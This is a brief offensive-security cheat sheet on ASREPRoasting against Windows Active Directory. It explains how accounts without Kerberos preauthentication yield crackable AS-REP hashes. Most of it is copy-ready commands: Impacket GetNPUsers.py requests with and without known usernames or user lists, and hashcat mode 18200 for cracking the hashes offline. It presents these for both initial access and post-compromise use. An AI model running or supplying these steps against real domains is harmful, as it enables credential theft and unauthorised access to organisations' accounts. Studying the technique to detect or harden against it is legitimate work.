# ASREPRoast

**In case of last resort.** **PS: This attack could be used in a post-compromise scenario but also in the initial attack vectors ;)**

## Brief

ASREPRoast is about retrieving crackable hashes from KRB5 AS-REP responses for users without kerberoast preauthentication enabled. This isn’t as useful as Kerberoasting, as accounts have to have DONT\_REQ\_PREAUTH() explicitly set for them to be vulnerable and you’re still reliant upon weak password complexity for the attack to work. But who knows, might be the only weak point you need. Now, if you can enumerate accounts in a Windows domain that don’t require Kerberos preauthentication, you can easily request a piece of encrypted information for said accounts and efficiently crack the material offline, revealing the user’s password. To do that you need to :

1. Send the **KRB\_AS\_REQ** to get the **KRB\_AS\_REP** with the encrypted information, to do so :
   1. If you have username :
      1. `GetNPUser.py $domain/$username -no-pass -dc-ip $ip -request`
   2. If you have no username :
      1. `GetNPUser.py $domain/ -no-pass -dc-ip $ip -request`
2. Crack hashes :
   1. `hashcat -m 18200 ticket wordlist`

```bash
# MISC of commands
GetNPUsers.py -dc-ip $ip -request $domain/

GetNPUsers.py -dc-ip $ip -request $domain/ -format hashcat/john

GetNPUsers.py -dc-ip $ip -usersfile users.txt $domain/

GetNPUsers.py $domain/backup -no-pass

GetNPUsers.py -no-pass $domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt
```
